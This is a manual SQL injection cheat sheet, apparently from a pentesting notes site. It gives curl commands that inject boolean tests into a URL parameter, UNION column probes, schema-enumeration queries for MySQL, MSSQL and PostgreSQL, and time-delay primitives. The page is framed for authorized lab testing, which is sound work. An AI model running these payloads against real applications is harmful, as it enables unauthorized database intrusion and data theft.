---
title: Manual SQL injection
order: 3
tags: [web, sqli, sql, mysql, mssql, postgresql, curl]
---

Use only an observed database-backed input. These query fragments are **alternatives
for their named DBMS**, not a batch to paste into an arbitrary application.
Adapted from the supplied [SQL Injection notes](https://app.notion.com/344bbf9f0e7480758dd4df68e70a744a)
and [OWASP testing method](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection).

## Boolean comparison

On Kali, use the real URL and parameter. Confirm the unchanged baseline first.

```bash
curl -i -G '{{URL}}' --data-urlencode '{{PARAM}}=1 AND 1=1'
```

Compare with one deliberately false condition:

```bash
curl -i -G '{{URL}}' --data-urlencode '{{PARAM}}=1 AND 1=2'
```

String contexts may need a quote and a DBMS-specific comment. Repeat comparisons
with the same session and application state. A single differing page is a lead.

## UNION column and display checks

After establishing query context, determine the original column count and types.
These fragments illustrate a three-column query, not a universal payload:

```sql
ORDER BY 3
UNION SELECT NULL,NULL,NULL
```

Change the count one step at a time. Once compatible, use a harmless marker in a
displayed text column. Suppressed errors and type mismatches can hide a valid
injection; a failed UNION is not proof of safety.

## MySQL context and schema

After confirming MySQL and a compatible query position:

```sql
SELECT VERSION(), DATABASE(), USER();
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema=DATABASE();
SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{{TABLE}}';
```

These are SQL statements for a SQL client or an adapted injection, not a complete
HTTP request. Read only the data needed for the lab objective. [MySQL INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html).

## MSSQL context and schema

```sql
SELECT @@VERSION;
SELECT DB_NAME(), SYSTEM_USER, USER_NAME();
SELECT name FROM sys.databases;
SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

Database visibility and OS execution depend on effective permissions. Check
[MSSQL execution prerequisites](services/databases#mssql-command-execution)
separately. [Microsoft information schema](https://learn.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/system-information-schema-views-transact-sql).

## PostgreSQL context and schema

```sql
SELECT version(), current_database(), current_user;
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema');
```

Do not assume a database login can read server files or run OS commands.
[PostgreSQL information schema](https://www.postgresql.org/docs/current/information-schema.html).

## Timing checks

| Confirmed DBMS | Relevant primitive | Interpretation |
| --- | --- | --- |
| MySQL | `SLEEP(5)` | Function invocation must fit the observed query context |
| PostgreSQL | `pg_sleep(5)` | Function and return type must fit the query |
| MSSQL | `WAITFOR DELAY '00:00:05'` | Statement/stacked-query support is required |

Interleave baseline and test requests several times and record distributions.
Network jitter, server load and caching can imitate a delay. Do not claim a
DBMS or injection from one slow request.
